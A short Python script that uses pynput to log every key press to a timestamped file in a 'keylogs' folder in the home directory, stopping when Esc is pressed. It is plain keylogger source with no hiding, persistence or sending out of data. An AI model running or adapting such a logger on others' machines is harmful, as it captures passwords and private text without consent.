import os
import time
from pynput.keyboard import Key, Listener

# Define the folder name and create it in the user's home directory
log_folder = os.path.join(os.path.expanduser("~"), "keylogs")
os.makedirs(log_folder, exist_ok=True)

# Generate a timestamp for the log file
timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")

# Define a function to write the key presses to a log file.
def write_to_log(key):
    log_filename = os.path.join(log_folder, f"keylog_{timestamp}.txt")
    with open(log_filename, "a") as log_file:
        log_file.write(str(key) + "\n")

# Define a function that listens for key presses and writes them to the log file.
def on_key_press(key):
    if key == Key.esc:
        # Stop keylogger
        return False
    write_to_log(key)

# Set up the keylogger
with Listener(on_press=on_key_press) as listener:
    listener.join()
